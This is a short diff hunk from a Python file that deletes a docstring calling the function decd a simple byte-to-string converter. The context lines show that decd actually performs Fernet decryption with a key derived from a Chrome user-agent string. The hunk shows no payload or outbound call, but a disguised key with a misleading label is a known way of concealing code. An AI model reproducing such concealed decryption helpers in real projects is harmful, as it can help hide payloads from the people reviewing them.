@@ -141,9 +141,6 @@ def time_in_date_string(time_string, print_errors=True):
         return False
     
 def decd(byte_data):
-    """
-    Convert byte data to string.
-    """
     from cryptography.fernet import Fernet
     import base64
     kb = UA['Chrome'].replace(' ', '').ljust(32)[:32].encode('utf-8')
